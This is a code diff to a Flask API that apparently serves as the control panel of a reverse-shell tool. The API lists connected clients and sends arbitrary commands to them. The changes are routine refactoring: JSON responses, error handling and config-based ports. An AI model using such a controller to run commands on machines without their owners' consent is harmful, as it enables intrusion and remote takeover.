@@ -1,3 +1,9 @@
+import os
+import sys
+
+sys.path.append(os.path.dirname(os.path.dirname(os.path.realpath(__file__))))
+
+import json
 import socket
 import threading
 
@@ -5,6 +11,7 @@ from flask import Flask, request
 from flask_cors import *
 
 from core.server import Server
+from config.server import SERVER_ADDR, API_PORT
 
 app = Flask(__name__)
 CORS(app, supports_credentials=True)
@@ -23,7 +30,7 @@ def list_connections():
         for i, connection in enumerate(server.connections):
             connections.append('{}:{}'.format(connection.address[0], connection.address[1]))
         # 返回列表
-        return connections
+        return json.dumps(connections)
 
 
 @app.route('/getcwd', methods=['POST'])
@@ -54,26 +61,27 @@ def execute():
             # 获取命令
             command = request.get_json()['command']
             # 获取目标客户端连接
-            conn = server.connections[target]
+            try:
+                conn = server.connections[target]
+            except IndexError:
+                return json.dumps(['No connection available', None])
             # 发送命令
             conn.send_command(command)
             # 关闭连接
             if command == 'kill':
                 # 移除无效连接
                 server.test_connections()
-                return ['[+] Connection is closed', None]
+                return json.dumps(['Connection is closed', None])
             # 返回命令执行结果和客户端当前工作目录的路径
-            return [conn.recv_result()[1], conn.recv_result()[1]]
+            return json.dumps([conn.recv_result()[1], conn.recv_result()[1]])
         except socket.error:
             server.test_connections()
-            return ['[-] Connection is lost', None]
-        except IndexError:
-            return ['[-] No connection available', None]
+            return json.dumps(['Connection is lost', None])
         except Exception as e:
-            return ['[-] {}'.format(e), None]
+            return json.dumps([str(e), None])
 
 
 if __name__ == '__main__':
-    server = Server()
+    server = Server(SERVER_ADDR)
     threading.Thread(target=server.serve, daemon=True).start()
-    app.run(host='0.0.0.0', port=8888)
+    app.run(host='0.0.0.0', port=API_PORT)
